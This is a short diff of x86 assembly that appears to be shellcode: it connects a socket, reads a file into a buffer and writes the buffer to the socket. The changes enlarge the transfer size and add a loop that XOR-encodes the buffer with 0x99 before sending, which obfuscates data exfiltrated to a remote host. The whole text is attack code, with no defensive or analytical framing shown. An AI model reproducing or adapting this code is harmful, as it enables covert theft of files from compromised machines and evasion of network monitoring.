@@ -24,7 +24,6 @@ connect:
 	pushl $98 
 	popl  %eax
 	int  $0x80
-
 dup:
 	pushl $0x2
 	popl  %ecx
@@ -60,7 +59,7 @@ read:
 	sub $0x80, %esp
 
         xorl %eax, %eax
-	movb $0x30, %al
+	movb $0xaa, %al
 	push %eax        ## 32 bytes
 	push %esi        ## buff
 	movl %edx, %eax  ## read from the file
@@ -69,10 +68,19 @@ read:
 	movb $3, %al
 	int $0x80
 
+	xorl %ecx, %ecx
+xor_loop:
+	movb (%esi, %ecx), %al
+	xorb $0x99, %al  
+	movb %al, (%esi, %ecx)
+	incl %ecx	
+	cmpb $0xaa, %cl
+	jnz xor_loop 
+	
 # write (edx, esi, 32)
 write:
         xorl %eax, %eax
-	movb $0x30, %al
+	movb $0xaa, %al
 	push %eax        ## 32 bytes
 	push %esi        ## buff
 	push $0x0        ## write to the socket
